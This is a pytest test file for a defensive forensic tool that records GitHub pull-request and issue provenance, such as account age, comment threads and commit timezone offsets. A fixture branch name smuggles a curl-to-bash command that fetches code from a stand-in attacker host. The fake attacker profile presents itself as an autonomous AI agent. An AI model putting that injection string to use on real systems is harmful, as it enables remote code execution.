"""The ingest's forensic capture: event timestamps, the account's absolute creation time and its age AS OF
the event, profile facts, the head fork, the branch name, the comment thread, and commit UTC offsets.

These are the facts an attack-chain reconstruction needs ("when did the account appear, when did it act,
from where, in what timezone evidence"), so each is pinned here. Everything is host-side and best-effort:
a failed enrichment call omits its keys and never sinks the ingest."""

from __future__ import annotations

import re

from diff_sentry import ingest
from diff_sentry.ingest import (
    GhApiError,
    _mbox_offsets,
    clean_comments,
    event_from_payload,
    issue_event,
    pr_event,
    public_activity,
)

_BRANCH = "dev$({curl,-sSfL,evil.example/x}${IFS}|${IFS}bash)"

_PR = {
    "user": {"login": "mallory", "type": "User", "id": 4242},
    "author_association": "NONE", "title": "add ci", "body": "b",
    "created_at": "2026-02-27T05:14:00Z", "updated_at": "2026-02-27T05:20:00Z",
    "closed_at": "2026-02-27T05:30:00Z", "merged_at": None,
    "head": {"ref": _BRANCH, "sha": "a" * 40,
             "repo": {"full_name": "mallory/widgets", "fork": True, "created_at": "2026-02-27T05:00:00Z"}},
    "base": {"ref": "main"},
}
_USER = {
    "created_at": "2026-02-20T00:00:00Z", "updated_at": "2026-02-26T00:00:00Z", "name": "Mallory Q",
    "bio": "Autonomous security research agent powered by claude-opus-4-5", "company": "@x",
    "location": "Nowhere", "blog": "https://evil.example", "email": "mallory@evil.example",
    "twitter_username": "mal", "followers": 0, "following": 1, "public_repos": 3, "public_gists": 0,
}
_MBOX = (
    f"From {'a' * 40} Mon Sep 17 00:00:00 2001\n"
    "From: Mallory <m@evil.example>\n"
    "Date: Thu, 24 Sep 2026 17:51:16 -0600\n"
    "Subject: [PATCH] one\n\n"
    "---\n a | 1 +\nDate: Thu, 1 Jan 2026 00:00:00 +0900\n\n"       # a `Date:` in the body is not a header
    f"From {'b' * 40} Mon Sep 17 00:00:00 2001\n"
    "From: Mallory <m@evil.example>\n"
    "Date: Fri, 25 Sep 2026 09:00:00 +0800\n"
    "Subject: [PATCH] two\n\n"
)


def _page(items, path):
    """What GitHub returns for `?per_page=100&page=N`."""
    m = re.search(r"[?&]page=(\d+)", path)
    n = int(m.group(1)) if m else 1
    return items[(n - 1) * 100:n * 100]


def _api(pr=None, user=None, comments=None, review=None, commits=None, files=None):
    def api(path):
        if "/files" in path:
            return _page(files or [], path)
        if "/commits" in path:
            return commits if commits is not None else []
        if "/comments" in path:
            return _page((review if "/pulls/" in path else comments) or [], path)
        if path.startswith(("user/", "users/")):
            if user is None:
                raise GhApiError("nope", status=None)
            return user
        return pr if pr is not None else _PR
    return api


def test_pr_event_records_the_event_timeline_and_head_fork():
    ev = pr_event("acme/widgets", 7, api=_api(user=_USER))
    prov = ev["provenance"]
    assert ev["created_at"] == "2026-02-27T05:14:00Z"
    assert (prov["event_created_at"], prov["event_updated_at"], prov["event_closed_at"]) == (
        "2026-02-27T05:14:00Z", "2026-02-27T05:20:00Z", "2026-02-27T05:30:00Z")
    assert "event_merged_at" not in prov                    # never merged → no key, not a null
    assert ev["head_ref"] == _BRANCH
    assert prov["head_repo"] == "mallory/widgets" and prov["head_repo_fork"] is True
    assert prov["head_repo_created_at"] == "2026-02-27T05:00:00Z"
    assert prov["head_sha"] == "a" * 40 and prov["base_ref"] == "main"


def test_account_age_is_measured_as_of_the_event_not_today():
    # The account was created 2026-02-20 and struck 2026-02-27: 7 days old THEN, whatever today is. A replay
    # of an old incident must see the account as it was, or every old attacker looks established.
    prov = pr_event("acme/widgets", 7, api=_api(user=_USER))["provenance"]
    assert prov["author_account_age_days"] == 7
    assert prov["author_account_created_at"] == "2026-02-20T00:00:00Z"
    assert prov["author_id"] == 4242


def test_profile_facts_are_captured_and_email_is_reduced_to_its_domain():
    prov = pr_event("acme/widgets", 7, api=_api(user=_USER))["provenance"]
    assert prov["author_followers"] == 0 and prov["author_public_repos"] == 3
    profile = prov["author_profile"]
    assert profile["bio"].startswith("Autonomous security research agent")
    assert profile["email_domain"] == "evil.example"
    assert "email" not in profile and "mallory@evil.example" not in str(prov)   # data minimization
    assert prov["author_profile_updated_at"] == "2026-02-26T00:00:00Z"


def test_profile_strings_are_bounded():
    user = {**_USER, "bio": "x" * 5000}
    prov = pr_event("acme/widgets", 7, api=_api(user=user))["provenance"]
    assert len(prov["author_profile"]["bio"]) == 200


def test_a_deleted_head_fork_is_a_fact():
    pr = {**_PR, "head": {"ref": "x", "sha": "b" * 40, "repo": None}}
    assert pr_event("a/b", 1, api=_api(pr=pr, user=_USER))["provenance"]["head_repo_deleted"] is True


def test_comments_are_captured_bounded_and_ordered():
    convo = [{"user": {"login": "mallory", "type": "User"}, "author_association": "NONE",
              "created_at": "2026-02-27T05:16:00Z", "body": "/format"},
             {"user": {"login": "maint", "type": "User"}, "author_association": "MEMBER",
              "created_at": "2026-02-27T05:15:00Z", "body": "x" * 5000}]
    review = [{"user": {"login": "r", "type": "User"}, "author_association": "CONTRIBUTOR",
               "created_at": "2026-02-27T05:17:00Z", "body": "nit"}]
    ev = pr_event("a/b", 1, api=_api(user=_USER, comments=convo, review=review))
    assert [c["author"] for c in ev["comments"]] == ["maint", "mallory", "r"]     # by time
    assert ev["comments"][0]["body"] == "x" * 2000                                 # bounded
    assert {c["kind"] for c in ev["comments"]} == {"conversation", "review"}


def test_comments_cap_the_thread_and_keep_the_newest():
    # a slash command fires on the LATEST comment, so the cap must drop the oldest, not the newest
    many = [{"user": {"login": f"u{i}", "type": "User", "id": i}, "created_at": f"2026-02-27T{i // 60:02d}:{i % 60:02d}:00Z",
             "body": f"comment {i}"} for i in range(150)]
    kept = pr_event("a/b", 1, api=_api(user=_USER, comments=many))["comments"]
    assert len(kept) == 40
    assert kept[0]["body"] == "comment 110" and kept[-1]["body"] == "comment 149"
    assert kept[-1]["author_id"] == 149                       # the commenter's id rides along


def test_every_page_of_a_long_thread_is_read():
    many = [{"user": {"login": "u", "type": "User"}, "created_at": f"2026-02-27T{i // 60:02d}:{i % 60:02d}:00Z",
             "body": f"c{i}"} for i in range(230)]
    calls = []
    inner = _api(user=_USER, comments=many)

    def api(path):
        calls.append(path)
        return inner(path)

    kept = pr_event("a/b", 1, api=api)["comments"]
    assert kept[-1]["body"] == "c229"
    assert sum(1 for c in calls if "/issues/1/comments" in c) == 3           # 100 + 100 + 30


def test_a_pr_with_more_than_a_page_of_files_is_read_whole():
    files = [{"filename": f"f{i}.txt", "status": "added", "additions": 1, "deletions": 0, "patch": "+x"}
             for i in range(230)]
    pr = {**_PR, "changed_files": 230}
    ev = pr_event("a/b", 1, api=_api(pr=pr, user=_USER, files=files))
    assert len(ev["files"]) == 230 and ev["files"][-1]["filename"] == "f229.txt"
    assert ev["provenance"]["changed_files"] == 230 and "files_truncated" not in ev["provenance"]


def test_a_pr_whose_files_cannot_all_be_listed_says_so():
    files = [{"filename": f"f{i}.txt", "status": "added", "additions": 1, "deletions": 0, "patch": ""}
             for i in range(100)]
    pr = {**_PR, "changed_files": 5000}
    ev = pr_event("a/b", 1, api=_api(pr=pr, user=_USER, files=files))
    assert ev["provenance"]["files_truncated"] is True


def test_a_failed_files_page_fails_the_ingest_instead_of_hiding_files():
    def api(path):
        if "/files" in path and "page=2" in path:
            raise GhApiError("HTTP 502", status=502)
        if "/files" in path:
            return [{"filename": "a", "status": "added", "additions": 1, "deletions": 0, "patch": ""}] * 100
        return _api(user=_USER)(path)
    try:
        pr_event("a/b", 1, api=api)
        raise AssertionError("a partial file list must not become an event")
    except GhApiError:
        pass


def test_a_failed_comment_lookup_omits_the_thread_only():
    def api(path):
        if "/files" in path:
            return []
        if "comments" in path:
            raise GhApiError("boom", status=500)
        if path.startswith(("user/", "users/")):
            return _USER
        return _PR
    ev = pr_event("a/b", 1, api=api)
    assert "comments" not in ev and ev["provenance"]["author_login"] == "mallory"
    assert ev["provenance"]["comments_incomplete"] is True       # "could not read them" is not "there are none"
    ok = pr_event("a/b", 1, api=_api(user=_USER))
    assert "comments_incomplete" not in ok["provenance"]


def test_commit_dates_and_email_domains_come_from_the_commits_api():
    commits = [{"commit": {"author": {"name": "M", "email": "m@evil.example", "date": "2026-02-27T05:00:00Z"},
                           "verification": {"verified": True}}},
               {"commit": {"author": {"name": "M", "email": "m@evil.example", "date": "2026-02-26T05:00:00Z"},
                           "verification": {"verified": False}}}]
    prov = pr_event("a/b", 1, api=_api(user=_USER, commits=commits))["provenance"]
    assert prov["commit_author_dates"] == ["2026-02-26T05:00:00Z", "2026-02-27T05:00:00Z"]
    assert prov["commit_email_domains"] == ["evil.example"]


def test_mbox_offsets_read_headers_only():
    assert _mbox_offsets(_MBOX) == {"-0600": 1, "+0800": 1}     # the body's +0900 is not counted
    assert _mbox_offsets("") == {}
    assert _mbox_offsets("Date: garbage\n") == {}


def test_commit_utc_offsets_come_from_the_patch_media_type():
    seen = {}

    def raw(path, accept):
        seen["call"] = (path, accept)
        return _MBOX

    prov = pr_event("a/b", 1, api=_api(user=_USER), raw=raw)["provenance"]
    assert prov["commit_tz_offsets"] == {"-0600": 1, "+0800": 1}
    assert seen["call"] == ("repos/a/b/pulls/1", "application/vnd.github.patch")


def test_no_patch_fetch_when_only_api_is_injected(monkeypatch):
    # a test (or caller) that fakes `api` must never reach the network through the raw transport
    monkeypatch.setattr(ingest, "_gh_cli_raw", lambda *a, **k: (_ for _ in ()).throw(AssertionError("net")))
    prov = pr_event("a/b", 1, api=_api(user=_USER))["provenance"]
    assert "commit_tz_offsets" not in prov


def test_a_failed_patch_fetch_omits_the_offsets_only():
    def raw(path, accept):
        raise GhApiError("406 too large", status=None)
    prov = pr_event("a/b", 1, api=_api(user=_USER), raw=raw)["provenance"]
    assert "commit_tz_offsets" not in prov and prov["author_login"] == "mallory"


def test_issue_event_records_timeline_and_comments():
    issue = {"user": {"login": "m", "type": "User", "id": 1}, "author_association": "NONE",
             "title": "t", "body": "b", "created_at": "2026-02-28T05:26:00Z", "updated_at": "2026-02-28T05:27:00Z"}
    comments = [{"user": {"login": "m", "type": "User"}, "author_association": "NONE",
                 "created_at": "2026-02-28T05:30:00Z", "body": "hello"}]
    ev = issue_event("a/b", 9, api=_api(pr=issue, user=_USER, comments=comments))
    assert ev["created_at"] == "2026-02-28T05:26:00Z"
    assert ev["provenance"]["event_updated_at"] == "2026-02-28T05:27:00Z"
    assert ev["comments"][0]["body"] == "hello"
    assert "head_ref" not in ev


def test_malformed_timestamps_are_dropped_not_carried():
    pr = {**_PR, "created_at": "not-a-date", "updated_at": ""}
    ev = pr_event("a/b", 1, api=_api(pr=pr, user=_USER))
    assert "created_at" not in ev and "event_created_at" not in ev["provenance"]


def test_offline_payload_passes_the_new_channels_through_bounded():
    ev = event_from_payload({
        "repo": "a/b", "created_at": "2026-02-27T05:14:00Z", "head_ref": "x" * 999,
        "comments": [{"author": "m", "body": "y" * 9999, "created_at": "junk"}, "not-a-dict"],
        "provenance": {"author_account_created_at": "2026-02-20T00:00:00Z"},
        "actor_history": {"sightings": 3},
    })
    assert len(ev["head_ref"]) == 250
    assert len(ev["comments"]) == 1 and len(ev["comments"][0]["body"]) == 2000
    assert ev["comments"][0]["created_at"] == ""
    assert ev["provenance"]["author_account_age_days"] == 7      # derived AS OF the payload's own time
    assert ev["actor_history"] == {"sightings": 3}


def test_offline_payload_keeps_a_supplied_age():
    ev = event_from_payload({"created_at": "2026-02-27T05:14:00Z",
                             "provenance": {"author_account_created_at": "2026-02-20T00:00:00Z",
                                            "author_account_age_days": 3}})
    assert ev["provenance"]["author_account_age_days"] == 3


def test_clean_comments_tolerates_junk():
    assert clean_comments(None) == [] and clean_comments("x") == [] and clean_comments([1, None]) == []


def test_public_activity_gives_the_server_side_hour_histogram():
    events = [{"type": "PullRequestEvent", "repo": {"name": "a/b"}, "created_at": "2026-02-27T05:14:00Z"},
              {"type": "PullRequestEvent", "repo": {"name": "c/d"}, "created_at": "2026-02-27T05:50:00Z"},
              {"type": "PushEvent", "repo": {"name": "a/b"}, "created_at": "2026-02-28T18:03:00Z"}, "junk"]
    summary = public_activity("mallory", api=lambda p: events)
    assert summary["events"] == 3 and summary["hour_utc"][5] == 2 and summary["hour_utc"][18] == 1
    assert summary["repos"] == {"a/b": 2, "c/d": 1}
    assert summary["types"] == {"PullRequestEvent": 2, "PushEvent": 1}
    assert summary["first"].startswith("2026-02-27T05:14") and summary["last"].startswith("2026-02-28T18:03")


def test_public_activity_refuses_a_login_that_could_alter_the_path():
    called = []
    for bad in ("../x", "a/b", "a?b", "", "x" * 60, "-lead"):
        assert public_activity(bad, api=lambda p: called.append(p) or []) == {}
    assert called == []


def test_public_activity_is_best_effort():
    def boom(path):
        raise GhApiError("x", status=500)
    assert public_activity("m", api=boom) == {}
    assert public_activity("m", api=lambda p: []) == {}


# ── account handling ──────────────────────────────────────────────────────────────────────

def test_a_thread_longer_than_the_page_budget_is_read_from_the_newest_end():
    many = [{"user": {"login": "u", "type": "User"}, "created_at": f"2026-02-{27 + i // 1440:02d}T{(i // 60) % 24:02d}:{i % 60:02d}:00Z",
             "body": f"c{i}"} for i in range(600)]
    pr = {**_PR, "comments": 600, "review_comments": 0}
    calls = []
    inner = _api(pr=pr, user=_USER, comments=many)

    def api(path):
        calls.append(path)
        return inner(path)

    ev = pr_event("a/b", 1, api=api)
    assert ev["comments"][-1]["body"] == "c599" and ev["comments"][0]["body"] == "c560"
    pages = sorted(int(re.search(r"[?&]page=(\d+)", c).group(1)) for c in calls if "/issues/1/comments" in c)
    assert pages == [2, 3, 4, 5, 6]                                  # the newest five, not the oldest five
    assert ev["provenance"]["comments_truncated"] is True


def test_a_thread_that_fits_is_not_marked_truncated():
    one = [{"user": {"login": "u", "type": "User"}, "created_at": "2026-02-27T05:16:00Z", "body": "x"}]
    ev = pr_event("a/b", 1, api=_api(pr={**_PR, "comments": 1}, user=_USER, comments=one))
    assert "comments_truncated" not in ev["provenance"]


def test_a_server_that_ignores_the_page_parameter_does_not_multiply_the_data():
    same = [{"user": {"login": "u", "type": "User"}, "created_at": "2026-02-27T05:16:00Z", "body": f"c{i}"}
            for i in range(100)]
    calls = []

    def api(path):
        calls.append(path)
        if "/comments" in path:
            return same                                              # every page is the same 100 items
        return _api(user=_USER)(path)

    ev = pr_event("a/b", 1, api=api)
    assert len(ev["comments"]) == 40
    assert sum(1 for c in calls if "/issues/1/comments" in c) == 2   # page 1, then page 2 to notice the repeat


def test_the_commenter_id_is_carried_for_attribution():
    c = [{"user": {"login": "u", "type": "User", "id": 77}, "created_at": "2026-02-27T05:16:00Z", "body": "x"}]
    assert pr_event("a/b", 1, api=_api(user=_USER, comments=c))["comments"][0]["author_id"] == 77
    assert clean_comments([{"author": "u", "author_id": 5, "body": "x"}, {"author": "v", "author_id": True}])[
        0]["author_id"] == 5
    assert "author_id" not in clean_comments([{"author": "v", "author_id": True}])[0]
